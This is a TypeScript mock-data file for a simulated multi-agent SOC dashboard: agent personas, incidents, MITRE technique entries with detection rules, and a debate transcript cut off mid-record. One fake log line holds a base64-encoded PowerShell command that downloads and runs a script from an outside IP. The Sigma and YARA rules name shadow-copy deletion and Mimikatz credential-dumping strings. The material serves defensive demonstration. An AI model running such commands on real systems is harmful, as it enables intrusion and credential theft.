import {
  Incident,
  IncidentStatus,
  SOCMetric,
  AgentPersona,
  MitreTechnique,
  SIEMLog,
  WiFiAccessPoint,
  EndpointHost,
  FirewallRule,
  ThreatFeedItem,
  SwarmDebateMessage,
  PacketDissection,
} from "../types";

export const AGENT_PERSONAS: AgentPersona[] = [
  {
    id: "commander",
    name: "Commander Nexus",
    title: "SOC Incident Commander",
    badge: "COMMANDER",
    avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
    description: "Presides over escalation authority, strategic containment, and enterprise risk management.",
    color: "cyan",
    capabilities: ["Escalation Matrix", "Cross-Team SOAR Playbooks", "DEFCON State Control", "Executive Alerting"],
    systemRole: "Strategic Commander",
  },
  {
    id: "hunter",
    name: "Hunter Aegis",
    title: "Lead Threat Hunter",
    badge: "HUNTER",
    avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80",
    description: "Specializes in hypothesis-driven hunting, SIEM log correlation, and IOC detection.",
    color: "emerald",
    capabilities: ["KQL/Splunk Query Synthesis", "Anomalous Entropy Detector", "APT Campaign Graphing"],
    systemRole: "Hypothesis Threat Hunter",
  },
  {
    id: "malware",
    name: "Analyst Spectre",
    title: "Principal Malware Engineer",
    badge: "MALWARE",
    avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80",
    description: "Expert in decompilation, YARA rule matching, memory injection, and C2 reverse engineering.",
    color: "purple",
    capabilities: ["Static/Dynamic Unpacking", "Cobalt Strike Extraction", "YARA Rule Synthesizer"],
    systemRole: "Malware Reverse Engineer",
  },
  {
    id: "forensics",
    name: "Forensics Cipher",
    title: "Digital Forensics & DFIR Lead",
    badge: "DFIR",
    avatar: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&auto=format&fit=crop&q=80",
    description: "Extracts volatile memory artifacts, MFT records, EVTX timelines, and registry keys.",
    color: "amber",
    capabilities: ["Volatility Memory Analysis", "EVTX Event Correlator", "File System Artifact Extraction"],
    systemRole: "Forensics Artifact Inspector",
  },
  {
    id: "responder",
    name: "Responder Vanguard",
    title: "Automated Incident Responder",
    badge: "RESPONSE",
    avatar: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=150&auto=format&fit=crop&q=80",
    description: "Executes instant containment, firewall blocks, active directory locks, and host isolation.",
    color: "rose",
    capabilities: ["Automated Host Isolation", "Firewall Dynamic ACLs", "AD Account Revocation"],
    systemRole: "Automated SOAR Responder",
  },
  {
    id: "reporter",
    name: "Reporter Sentinel",
    title: "Executive Reporter & CISO Advisor",
    badge: "CISO ADVISOR",
    avatar: "https://images.unsplash.com/photo-1580489944761-15a19d654956?w=150&auto=format&fit=crop&q=80",
    description: "Transforms raw SOC telemetry into executive CISO briefings and regulatory compliance reports.",
    color: "blue",
    capabilities: ["CISO Summary Generation", "Regulatory Impact Analysis", "PDF Briefing Export"],
    systemRole: "Executive Report Generator",
  },
];

export const INITIAL_METRICS: SOCMetric[] = [
  {
    id: "m1",
    label: "Security Posture Index",
    value: "92 / 100",
    change: "+3.5%",
    trend: "up",
    color: "emerald",
    subtext: "Optimal defense baseline across 1,240 endpoints",
  },
  {
    id: "m2",
    label: "Active Critical Incidents",
    value: "3",
    change: "-1 from 1h ago",
    trend: "down",
    color: "rose",
    subtext: "1 Ransomware Canary • 1 Kerberoasting • 1 Rogue Wi-Fi",
  },
  {
    id: "m3",
    label: "Mean Time To Detect (MTTD)",
    value: "1.8 m",
    change: "-32s vs yesterday",
    trend: "up",
    color: "cyan",
    subtext: "Automated AI triage speed benchmark",
  },
  {
    id: "m4",
    label: "Mean Time To Respond (MTTR)",
    value: "4.2 m",
    change: "-1.1m vs baseline",
    trend: "up",
    color: "purple",
    subtext: "SOAR playbook auto-containment rate: 88%",
  },
  {
    id: "m5",
    label: "Ingested Log Events / 24h",
    value: "14.82 M",
    change: "18,450 eps peak",
    trend: "neutral",
    color: "amber",
    subtext: "SIEM log volume: Palo Alto, CrowdStrike, EVTX, AWS CloudTrail",
  },
];

export const MOCK_INCIDENTS: Incident[] = [
  {
    id: "INC-2026-8801",
    title: "Cobalt Strike C2 Beaconing & LSASS Memory Dump",
    severity: "Critical",
    status: "Investigating",
    targetHost: "SRV-FINANCE-02",
    ipAddress: "10.0.4.112",
    timestamp: "2026-08-04T09:42:15Z",
    summary: "Suspicious powershell execution attempting to dump LSASS memory process via minidump API followed by outbound encrypted HTTPS beaconing to unknown external IP 185.220.101.44.",
    mitreTactics: ["Execution", "Credential Access", "Command and Control"],
    mitreTechniques: ["T1059.001 PowerShell", "T1003.001 LSASS Memory", "T1071.001 Web Protocols"],
    assignedAgent: "commander",
    impactScore: 9.2,
    attackGraphNodes: [
      { id: "n1", label: "Threat Actor (APT29)", type: "threat_actor", status: "compromised", riskScore: 95, details: "Known IP 185.220.101.44 associated with Nobelium infrastructure", x: 50, y: 150 },
      { id: "n2", label: "Phishing E-mail Link", type: "entry_point", status: "compromised", riskScore: 80, details: "Invoice_Update_Aug2026.pdf.exe clicked by user d.miller", x: 200, y: 150 },
      { id: "n3", label: "WS-FINANCE-09", type: "host", status: "compromised", os: "Windows 11 Enterprise", ip: "10.0.4.55", riskScore: 88, details: "Powershell spawned sub-process powershell.exe -Enc -NoP", x: 380, y: 150 },
      { id: "n4", label: "lsass.exe Process", type: "process", status: "compromised", riskScore: 92, details: "Process memory handle opened with PROCESS_VM_READ permissions", x: 550, y: 100 },
      { id: "n5", label: "SRV-DC-01 (Domain Controller)", type: "domain_controller", status: "vulnerable", os: "Windows Server 2022", ip: "10.0.1.10", riskScore: 75, details: "Kerberos TGT ticket requesting elevated privileges", x: 720, y: 150 },
      { id: "n6", label: "C2 Server (185.220.101.44)", type: "c2_server", status: "compromised", riskScore: 98, details: "Encrypted beaconing every 60s with 15% jitter over port 443", x: 890, y: 150 },
    ],
    attackGraphLinks: [
      { source: "n1", target: "n2", relationship: "Delivered Payload", protocol: "SMTP", step: 1 },
      { source: "n2", target: "n3", relationship: "Executed Process", protocol: "HTTP", step: 2 },
      { source: "n3", target: "n4", relationship: "Dumped Process Memory", protocol: "Win32 API", step: 3 },
      { source: "n3", target: "n5", relationship: "Lateral Kerberoast", protocol: "Kerberos:88", step: 4 },
      { source: "n3", target: "n6", relationship: "Outbound C2 Channel", protocol: "TLS 1.3 / HTTPS", step: 5 },
    ],
    timelineEvents: [
      { id: "t1", timestamp: "09:41:02 UTC", title: "Phishing Email Delivered", description: "Inbound email with malicious link delivered to finance department.", source: "Proofpoint Gateway", severity: "Low" },
      { id: "t2", timestamp: "09:42:15 UTC", title: "Malicious Attachment Execution", description: "User d.miller launched executable from downloaded zip archive.", source: "CrowdStrike EDR", severity: "Medium", mitreTechnique: "T1204.002" },
      { id: "t3", timestamp: "09:43:08 UTC", title: "LSASS Process Memory Dump", description: "Process powershell.exe requested direct memory access to lsass.exe.", source: "Sysmon Event 10", severity: "Critical", mitreTechnique: "T1003.001" },
      { id: "t4", timestamp: "09:44:20 UTC", title: "High-Entropy DNS Query", description: "Query for odd domain update-sec-server-4102.xyz returned IP 185.220.101.44.", source: "Infoblox DNS", severity: "High", mitreTechnique: "T1071.004" },
      { id: "t5", timestamp: "09:45:10 UTC", title: "Sentinel SOC Auto-Triage Triggered", description: "Multi-agent SOC Commander initiated automatic threat investigation.", source: "Sentinel SOAR", severity: "High" },
    ],
    rawLogs: [
      `[09:42:15.102] Sysmon Event 1: Process Creation: Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDQvcGF5bG9hZC5wczEnKQ=="`,
      `[09:43:08.441] Sysmon Event 10: ProcessAccess: SourceImage="C:\\Windows\\System32\\powershell.exe" TargetImage="C:\\Windows\\System32\\lsass.exe" GrantedAccess="0x1010"`,
      `[09:44:20.892] Palo Alto Firewall DENY: Src=10.0.4.112:54120 Dst=185.220.101.44:443 Proto=TCP Action=ALERT_DENY Bytes=4820`,
    ],
    containmentPlaybook: {
      id: "PB-409",
      name: "Ransomware & C2 Containment Workflow",
      steps: [
        { text: "Isolate Workstation WS-FINANCE-09 from internal network via EDR API", completed: true },
        { text: "Deploy egress firewall rule dropping traffic to 185.220.101.44", completed: true },
        { text: "Force reset Kerberos ticket-granting ticket and disable user account d.miller in Active Directory", completed: false },
        { text: "Capture volatile RAM dump from WS-FINANCE-09 before rebooting host", completed: false },
      ],
    },
  },
  {
    id: "INC-2026-8802",
    title: "Rogue Wi-Fi Access Point Evil Twin Attack Detected",
    severity: "High",
    status: "Open",
    targetHost: "AP-FLOOR3-WEST",
    ipAddress: "192.168.10.4",
    timestamp: "2026-08-04T08:15:30Z",
    summary: "Unauthorized Wireless Access Point broadcasting corporate SSID 'CORP-SECURE' with high transmit power near Executive Boardroom. Broadcasts lack WPA3 Enterprise 802.1X certificates.",
    mitreTactics: ["Initial Access", "Credential Access"],
    mitreTechniques: ["T1040 Network Sniffing", "T1557 Adversary-in-the-Middle"],
    assignedAgent: "hunter",
    impactScore: 7.8,
    attackGraphNodes: [
      { id: "w1", label: "Rogue Wi-Fi Pineapple", type: "threat_actor", status: "compromised", riskScore: 90, details: "BSSID 00:c0:ca:98:dd:01 broadcasting spoofed CORP-SECURE", x: 100, y: 150 },
      { id: "w2", label: "Executive Laptop-04", type: "host", status: "vulnerable", os: "macOS Sonoma", ip: "192.168.10.104", riskScore: 72, details: "Sent probe requests and connected to Rogue AP", x: 400, y: 150 },
      { id: "w3", label: "Deauth Packet Injector", type: "process", status: "compromised", riskScore: 85, details: "Continuous deauth frames targeting legitimate AP-FLOOR3-WEST", x: 700, y: 150 },
    ],
    attackGraphLinks: [
      { source: "w1", target: "w2", relationship: "Evil Twin Deception", protocol: "802.11 Wi-Fi", step: 1 },
      { source: "w1", target: "w3", relationship: "Injected Deauth Frames", protocol: "802.11 Management", step: 2 },
    ],
    timelineEvents: [
      { id: "wt1", timestamp: "08:12:00 UTC", title: "Deauth Burst Detected", description: "Wireless IDS detected 450 deauthentication frames targeting BSSID aa:bb:cc:11:22:33.", source: "Meraki WIDS", severity: "High" },
      { id: "wt2", timestamp: "08:15:30 UTC", title: "Rogue BSSID Spotted", description: "BSSID 00:c0:ca:98:dd:01 advertising SSID CORP-SECURE without 802.1X enterprise auth.", source: "Sentinel Wireless Sensor", severity: "High" },
    ],
    rawLogs: [
      `[08:15:30.011] WIDS Alert: UNASSOCIATED_ROGUE_AP BSSID=00:c0:ca:98:dd:01 Channel=6 RSSI=-42dBm SSID="CORP-SECURE" Encryption=WPA2-PSK (Expected WPA3-Enterprise)`,
    ],
    containmentPlaybook: {
      id: "PB-302",
      name: "Wireless Rogue AP Mitigation",
      steps: [
        { text: "Trigger counter-deauth containment from nearby APs aa:bb:cc:11:22:33", completed: true },
        { text: "Push emergency push notification to nearby executive mobile devices", completed: false },
        { text: "Dispatch physical security team to 3rd Floor West Wing", completed: false },
      ],
    },
  },
  {
    id: "INC-2026-8803",
    title: "Kerberoasting & Service Principal Name (SPN) Scanning",
    severity: "Medium",
    status: "Investigating" as IncidentStatus,
    targetHost: "SRV-DC-01",
    ipAddress: "10.0.1.10",
    timestamp: "2026-08-04T07:30:12Z",
    summary: "Service Principal Name request burst (Event Code 4769) requesting RC4-HMAC encrypted Kerberos tickets for high-privilege service accounts (MSSQL, HTTP, CIFS).",
    mitreTactics: ["Credential Access"],
    mitreTechniques: ["T1558.003 Kerberoasting"],
    assignedAgent: "forensics",
    impactScore: 6.4,
    attackGraphNodes: [
      { id: "k1", label: "Low-Privilege User User_Dev02", type: "threat_actor", status: "compromised", riskScore: 65, details: "Active Directory user compromised via password spray", x: 150, y: 150 },
      { id: "k2", label: "Kerberos Ticket Request", type: "process", status: "vulnerable", riskScore: 70, details: "Requested 18 TGS tickets with RC4 encryption (0x17)", x: 450, y: 150 },
      { id: "k3", label: "MSSQL Service Account", type: "domain_controller", status: "vulnerable", riskScore: 80, details: "Target account svc_mssql_admin has Domain Admin privileges", x: 750, y: 150 },
    ],
    attackGraphLinks: [
      { source: "k1", target: "k2", relationship: "Requested SPN Tickets", protocol: "Kerberos TGS-REQ", step: 1 },
      { source: "k2", target: "k3", relationship: "Targeted Service Account", protocol: "Active Directory", step: 2 },
    ],
    timelineEvents: [
      { id: "kt1", timestamp: "07:30:12 UTC", title: "TGS Request Burst", description: "18 TGS requests in 2 seconds targeting service accounts with weak encryption.", source: "Active Directory DC01", severity: "Medium" },
    ],
    rawLogs: [
      `[07:30:12.410] Security Event 4769: A Kerberos service ticket was requested. TargetName="MSSQLSvc/sql-prod.corp.local:1433" TicketEncryptionType="0x17" (RC4-HMAC)`,
    ],
    containmentPlaybook: {
      id: "PB-105",
      name: "Kerberos Ticket Hardening Playbook",
      steps: [
        { text: "Force password update for target service accounts", completed: true },
        { text: "Disable RC4-HMAC encryption in Kerberos security policy", completed: false },
      ],
    },
  },
];

export const MOCK_MITRE_TECHNIQUES: MitreTechnique[] = [
  {
    code: "T1566",
    name: "Phishing: Spearphishing Link",
    tactic: "Initial Access",
    status: "active_detection",
    severity: "High",
    adversary: "APT29 (Cozy Bear), FIN7",
    detectabilityScore: 85,
    description: "Adversaries send malicious emails containing hyperlinks targeting corporate users to deliver initial malware stagers or harvest credentials.",
    queryExample: 'event.category: "email" AND (email.attachment.extension: "exe" OR email.attachment.extension: "lnk" OR email.link.reputation < 30)',
    sigmaRule: `title: Suspicious Email Attachment or Clicked Link
id: 52a5dc83-2c1a-464a-939e-2f3b7b4a2e21
status: production
description: Detects user interaction with suspicious external attachment
logsource:
    category: proxy
    product: windows
detection:
    selection:
        c-uri|contains:
            - '.zip'
            - '.iso'
            - '.vhd'
            - '.lnk'
        cs-method: 'GET'
    condition: selection
level: high`,
    yaraRule: `rule Spearphishing_LNK_Payload {
    meta:
        description = "Detects malicious Windows LNK shortcut files used in initial spearphishing"
        author = "Sentinel SOC Threat Research"
        threat_actor = "APT29"
    strings:
        $header = { 4C 00 00 00 01 14 02 00 }
        $ps = "powershell.exe" nocase
        $enc = "-EncodedCommand" nocase
        $c2 = "http" nocase
    condition:
        $header at 0 and $ps and ($enc or $c2)
}`,
    suricataRule: `alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"SENTINEL-SOC Suspicious Inbound Zip/LNK Download"; flow:established,to_server; http.uri; content:".lnk"; fast_pattern; classtype:trojan-activity; sid:3000010; rev:1;)`,
    remediation: "Deploy FIDO2/WebAuthn mandatory MFA, enable Microsoft Defender for Office 365 Safe Links, quarantine high-risk inbound attachments.",
  },
  {
    code: "T1059",
    name: "Command and Scripting Interpreter: PowerShell",
    tactic: "Execution",
    status: "active_detection",
    severity: "Critical",
    adversary: "Lazarus Group, LockBit 4.0",
    detectabilityScore: 92,
    description: "Adversaries abuse PowerShell commands and scripts to execute malicious payloads, bypass script execution policies, and load in-memory assemblies.",
    queryExample: 'process.name: "powershell.exe" AND (process.command_line: "*-Enc*" OR process.command_line: "*Bypass*" OR process.command_line: "*DownloadString*")',
    sigmaRule: `title: Obfuscated PowerShell Execution
id: f439d5b0-13f6-455b-b9f4-0b1a03f4f89d
status: production
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc '
            - '-EncodedCommand'
            - 'DownloadString('
            - 'IEX('
            - 'FromBase64String'
    condition: selection
level: critical`,
    yaraRule: `rule Obfuscated_PowerShell_Script {
    meta:
        description = "Identifies in-memory obfuscated PowerShell cradle"
    strings:
        $a1 = "Net.WebClient" nocase
        $a2 = "DownloadString" nocase
        $a3 = "System.Reflection.Assembly" nocase
        $a4 = "[System.Convert]::FromBase64String" nocase
    condition:
        ($a1 and $a2) or ($a3 and $a4)
}`,
    suricataRule: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"SENTINEL-SOC Encrypted PowerShell Web Download Cradle"; content:"DownloadString"; http_client_body; sid:3000012; rev:2;)`,
    remediation: "Enforce PowerShell Constrained Language Mode (CLM), enable Script Block Logging (EID 4104), and configure AppLocker/WDAC policy.",
  },
  {
    code: "T1053",
    name: "Scheduled Task/Job: Scheduled Task",
    tactic: "Persistence",
    status: "monitored",
    severity: "Medium",
    adversary: "Turla, Sandworm",
    detectabilityScore: 78,
    description: "Adversaries configure scheduled tasks to maintain persistence, escalate privileges, and execute payloads at periodic intervals or upon user logon.",
    queryExample: 'event.code: 4698 AND (task.name: "*WinSec*" OR task.action: "*powershell*" OR task.action: "*rundll32*")',
    sigmaRule: `title: Suspicious Scheduled Task Creation
id: 9a2f7c41-8f3b-419a-9812-7bb3d09a22f1
status: production
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4698
        TaskContent|contains:
            - 'powershell.exe'
            - 'cmd.exe /c'
            - 'AppData\\Local\\Temp'
    condition: selection
level: high`,
    yaraRule: `rule Malicious_Scheduled_Task_XML {
    meta:
        description = "Detects XML task definitions with suspicious binary targets"
    strings:
        $tag = "<Task"
        $exec = "<Command>"
        $susp = "C:\\Windows\\Temp\\"
    condition:
        $tag and $exec and $susp
}`,
    suricataRule: `alert smb $HOME_NET any -> $HOME_NET any (msg:"SENTINEL-SOC Remote Scheduled Task SMB Creation"; flow:established,to_server; content:"ITaskScheduler"; sid:3000015; rev:1;)`,
    remediation: "Audit Event ID 4698/4702 logs via SIEM, restrict standard user access to schtasks.exe, and audit Autoruns registry hives.",
  },
  {
    code: "T1078",
    name: "Valid Accounts: Domain & Cloud Accounts",
    tactic: "Defense Evasion",
    status: "monitored",
    severity: "Medium",
    adversary: "Scattered Spider, APT29",
    detectabilityScore: 70,
    description: "Adversaries obtain and abuse existing legitimate credentials to blend in with normal administrative traffic and evade traditional signature alerts.",
    queryExample: 'event.code: 4624 AND user.is_first_login: true AND (network.source.geo.country_name != "US" OR network.direction: "external")',
    sigmaRule: `title: Impossible Travel / Anomalous Admin Login
id: 3c1a90d8-11f4-42b1-87a3-199c4d28f091
status: production
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 10 # RemoteInteractive RDP
        TargetUserName|contains:
            - 'admin'
            - 'svc_'
    condition: selection
level: medium`,
    yaraRule: `rule Credential_Config_Artifacts {
    meta:
        description = "Detects saved cleartext credentials in memory or files"
    strings:
        $p1 = "password=" nocase
        $p2 = "admin_password=" nocase
    condition:
        $p1 or $p2
}`,
    suricataRule: `alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"SENTINEL-SOC Multiple Failed Kerberos/NTLM Logins"; threshold:type both, track by_src, count 10, seconds 60; sid:3000018; rev:3;)`,
    remediation: "Deploy Conditional Access policies with risk-based sign-in blocks, mandate hardware FIDO2 tokens, and enforce privileged access workstations (PAWs).",
  },
  {
    code: "T1003",
    name: "OS Credential Dumping: LSASS Memory",
    tactic: "Credential Access",
    status: "active_detection",
    severity: "Critical",
    adversary: "FIN7, Wizard Spider (Ryuk/Conti)",
    detectabilityScore: 98,
    description: "Adversaries attempt to dump Local Security Authority Subsystem Service (LSASS) memory to steal cleartext passwords, NTLM hashes, and Kerberos tickets.",
    queryExample: 'process.target: "lsass.exe" AND (granted_access: "0x1010" OR granted_access: "0x1fffff" OR granted_access: "0x1410")',
    sigmaRule: `title: LSASS Memory Access and Dump
id: a1f83c92-3491-45a8-8b9f-09e4d101e459
status: production
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1F0FFF'
            - '0x1FFFFF'
            - '0x1410'
    filter:
        SourceImage|endswith:
            - '\\csagent.exe'
            - '\\MsMpEng.exe'
    condition: selection and not filter
level: critical`,
    yaraRule: `rule Mimikatz_LSASS_Dumping_Signatures {
    meta:
        description = "Detects Mimikatz sekurlsa and minidump artifacts"
        author = "Sentinel SOC Threat Research"
    strings:
        $m1 = "sekurlsa::logonpasswords" ascii wide nocase
        $m2 = "privilege::debug" ascii wide nocase
        $m3 = "lsasrv.dll" ascii wide nocase
        $m4 = "MiniDumpWriteDump" ascii wide nocase
    condition:
        2 of ($m*)
}`,
    suricataRule: `alert smb $HOME_NET any -> $HOME_NET any (msg:"SENTINEL-SOC Remote LSASS Named Pipe Access via SMB"; flow:established,to_server; content:"\\\\lsass"; fast_pattern; sid:3000020; rev:2;)`,
    remediation: "Enable Windows Defender Credential Guard (LSA Protection), restrict Debug privilege (SeDebugPrivilege), and turn on ASR rule 'Block credential stealing from LSASS'.",
  },
  {
    code: "T1021",
    name: "Remote Services: SMB/Windows Admin Shares",
    tactic: "Lateral Movement",
    status: "active_detection",
    severity: "High",
    adversary: "Sandworm (NotPetya), LockBit",
    detectabilityScore: 88,
    description: "Adversaries move laterally across internal networks by connecting to SMB shares (ADMIN$, C$, IPC$) using stolen administrative tokens.",
    queryExample: 'destination.port: 445 AND network.direction: "internal" AND (smb.share_name: "ADMIN$" OR smb.share_name: "C$")',
    sigmaRule: `title: Lateral Movement via Admin SMB Share
id: e4b29c11-9a1c-43f1-b928-87a911f92e10
status: production
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5140
        ShareName|contains:
            - 'ADMIN$'
            - 'C$'
            - 'IPC$'
    condition: selection
level: high`,
    yaraRule: `rule PsExec_Service_Creation {
    meta:
        description = "Detects PsExec service installation binaries and pipes"
    strings:
        $p1 = "\\\\.\\pipe\\psexec" ascii wide
        $p2 = "PsExec.exe" ascii wide nocase
    condition:
        $p1 or $p2
}`,
    suricataRule: `alert smb $HOME_NET any -> $HOME_NET 445 (msg:"SENTINEL-SOC Lateral SMB ADMIN$ Tree Connect"; flow:established,to_server; content:"ADMIN$"; fast_pattern; sid:3000022; rev:1;)`,
    remediation: "Block inbound port 445 on workstation host firewalls, implement microsegmentation, and deploy Microsoft LAPS for unique local admin credentials.",
  },
  {
    code: "T1071",
    name: "Application Layer Protocol: Web & DNS Protocols",
    tactic: "Command and Control",
    status: "active_detection",
    severity: "Critical",
    adversary: "Cobalt Strike, Sliver, Havoc C2",
    detectabilityScore: 94,
    description: "Adversaries disguise Command and Control (C2) beacons inside legitimate HTTP, HTTPS, and DNS request-response cycles with randomized jitter.",
    queryExample: 'dns.question.type: "TXT" AND dns.question.name.length > 45 OR (http.request.uri: "/api/v1/telemetry*" AND http.response.bytes > 5000)',
    sigmaRule: `title: Cobalt Strike Malleable C2 Beaconing
id: 7c91a0f8-33b2-4d1a-9f12-00b81e491a22
status: production
logsource:
    category: proxy
    product: windows
detection:
    selection:
        c-uri|contains:
            - '/submit.php?id='
            - '/pixel.gif'
            - '/match/'
        cs-header|contains: 'Cookie: SESSIONID='
    condition: selection
level: critical`,
    yaraRule: `rule Cobalt_Strike_Beacon_In_Memory {
    meta:
        description = "Detects in-memory Cobalt Strike Beacon reflection loader"
    strings:
        $loader = { 4D 5A 41 52 55 48 89 E5 48 83 EC }
        $pipe = "\\\\.\\pipe\\msse-" ascii wide
        $http = "%s%s: %s" ascii
    condition:
        $loader at 0 or ($pipe and $http)
}`,
    suricataRule: `alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:"SENTINEL-SOC Cobalt Strike Default TLS Certificate Subject"; tls.cert_subject; content:"CN=Major League Baseball"; sid:3000025; rev:4;)`,
    remediation: "Enforce TLS 1.3 Inspection on perimeter firewalls, block high-risk dynamic DNS categories, and deploy Jitter & Beacon Frequency anomaly detection.",
  },
  {
    code: "T1041",
    name: "Exfiltration Over C2 Channel",
    tactic: "Exfiltration",
    status: "monitored",
    severity: "High",
    adversary: "BlackCat / ALPHV, RansomHub",
    detectabilityScore: 84,
    description: "Adversaries exfiltrate sensitive intellectual property, databases, and configuration secrets back over active C2 command channels to cloud buckets.",
    queryExample: 'network.bytes_sent > 50000000 AND destination.ip.is_external: true AND flow.duration_seconds > 120',
    sigmaRule: `title: Large Outbound Data Transfer via Non-Standard Port
id: d19c8a2b-44f1-48e2-b102-44a19e83b100
status: production
logsource:
    category: firewall
detection:
    selection:
        bytes_out|gt: 50000000
        dst_port|nin:
            - 80
            - 443
            - 53
    condition: selection
level: high`,
    yaraRule: `rule Data_Archiver_7z_Rclone_Config {
    meta:
        description = "Detects rclone exfiltration tool configurations"
    strings:
        $r1 = "[mega]" nocase
        $r2 = "type = s3" nocase
        $r3 = "rclone.conf" nocase
    condition:
        2 of them
}`,
    suricataRule: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"SENTINEL-SOC Mega.nz/Rclone Cloud Storage Exfil Session"; flow:established,to_server; content:"mega.co.nz"; http_header; sid:3000028; rev:2;)`,
    remediation: "Deploy Cloud Access Security Broker (CASB) with egress DLP policies, enforce egress bandwidth rate limits, and block unapproved cloud storage buckets.",
  },
  {
    code: "T1486",
    name: "Data Encrypted for Impact: Ransomware",
    tactic: "Impact",
    status: "active_detection",
    severity: "Critical",
    adversary: "LockBit 4.0, BlackCat, Akira",
    detectabilityScore: 99,
    description: "Adversaries encrypt enterprise files, databases, and hypervisor storage pools to disrupt operations and extort ransom payments.",
    queryExample: 'file.extension: "*.locked" OR file.extension: "*.crypto" OR process.command_line: "*vssadmin delete shadows*"',
    sigmaRule: `title: VSS Shadow Copy Deletion & Ransomware Activity
id: 1f0a2d3c-9182-4b71-a831-77a82910c201
status: production
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\vssadmin.exe'
            - '\\wbadmin.exe'
            - '\\bcdedit.exe'
        CommandLine|contains:
            - 'delete shadows'
            - 'resize shadowstorage'
            - 'recoveryenabled no'
            - 'ignoreallfailures'
    condition: selection
level: critical`,
    yaraRule: `rule Generic_Ransomware_Note_Strings {
    meta:
        description = "Identifies ransom note text and cryptographic markers"
    strings:
        $n1 = "All your files have been encrypted" nocase
        $n2 = "TOR browser" nocase
        $n3 = "decrypt your files" nocase
        $n4 = "onion.pet" nocase
    condition:
        2 of them
}`,
    suricataRule: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"SENTINEL-SOC Ransomware TOR Node Egress Negotiation"; flow:established,to_server; content:"torproject.org"; sid:3000030; rev:2;)`,
    remediation: "Maintain immutable offline and air-gapped backups, deploy canary decoy files on file shares, and enable EDR Automated Ransomware Rollback.",
  },
];

export const MOCK_SWARM_DEBATE: SwarmDebateMessage[] = [
  {
    id: "swm-1",
    agentId: "commander",
    agentName: "Commander Vance",
    agentAvatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
    timestamp: "10:14:02 UTC",
    confidenceScore: 94,
    stance: "CONTAIN_NOW",
    content: "Incident INC-2026-8801 escalated to Priority Critical. LSASS memory dump detected on financial server SRV-FINANCE-02. I am proposing immediate network isolation of host 10.0.4.112.",
    technicalFinding: "Process Access EventID 10 targeting LSASS with GrantedAccess 0x1010 from unapproved PowerShell process PID 4102.",
    proposedAction: "Trigger CrowdStrike Falcon Network Containment & Egress Firewall Drop Rule #FW-1001.",
  },
  {
    id: "swm-2",
    agentId: "hunter",
    agentName: "Aegis the Hunter",
    agentAvatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80",
    timestamp: "10:14:15 UTC",
    confidenceScore: 89,
    stance: "MONITOR_BEACON",
    content: "Hold full containment for 45 seconds. I have identified outbound C2 beaconing to 185.220.101.44 with 60s jitter. Correlating lateral movement attempts across subnet 10.0.4.0/24 first to prevent secondary sleeper implants.",
    technicalFinding: "Correlated 14 anomalous DNS TXT queries with Shannon entropy > 4.8 to domain c2-beacon-update.xyz.",
    proposedAction: "Run SIEM live correlation on internal SMB (port 445) and WinRM (port 5985) traffic from SRV-FINANCE-02.",
  },
  {
    id: "swm-3",
    agentId: "malware",
    agentName: "Cipher Malware Analyst",
    agentAvatar: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&auto=format&fit=crop&q=80",
    timestamp: "10:14:28 UTC",
    confidenceScore: 98,
    stance: "CONTAIN_NOW",
    content: "Decompilation complete. Payload is Cobalt Strike Beacon v4.8 using Malleable C2 profile. Named pipe \\\\.\\pipe\\msse-4102-a has been spawned. Process injection into svchost.exe (PID 892) is imminent. Waiting increases risk of persistence.",
    technicalFinding: "Extracted config: Watermark 419201, C2 Public Key Hash match with APT29 infrastructure. Reflective DLL injection confirmed.",
    proposedAction: "Kill PID 4102 and isolate SRV-FINANCE-02 immediately. Do not delay containment.",
  },
  {
    id: "swm-4",
    agentId: "forensics",
    agentName: "Chronos Forensics",
    agentAvatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80",
    timestamp: "10:14:39 UTC",
    confidenceScore: 92,
    stance: "GATHER_EVIDENCE",
    content: "Snapshotting volatile memory (RAM) and acquiring MFT logs via EDR agent before network disconnect. Scheduled task 'WinSecMaintain' was created 3 minutes prior at 10:11:30 UTC for persistence.",
    technicalFinding: "LNK shortcut originated from phishing email 'Q3_Financial_Review.zip' delivered via Outlook at 10:09:12 UTC.",
    proposedAction: "Capture 16GB memory dump file for Volatility 3 analysis and quarantine C:\\Windows\\System32\\Tasks\\WinSecMaintain.",
  },
  {
    id: "swm-5",
    agentId: "responder",
    agentName: "Responder Vanguard",
    agentAvatar: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=150&auto=format&fit=crop&q=80",
    timestamp: "10:14:50 UTC",
    confidenceScore: 97,
    stance: "REVOKE_IDENTITY",
